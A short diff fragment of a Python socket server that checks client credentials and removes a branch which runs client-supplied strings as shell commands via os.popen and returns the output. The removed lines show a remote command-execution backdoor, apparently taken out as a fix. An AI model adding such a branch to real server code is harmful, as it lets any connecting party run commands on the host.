@@ -16,9 +16,3 @@ while True:
         username = data[1]
         password = data[2]
         client_obj.send(check_credentials(username, password).encode())
-    elif data[0] == 'cmd':
-        output = os.popen(data[1]).read()
-        if output:
-            client_obj.send(output.encode())
-        else:
-            client_obj.send(b'ERROR')
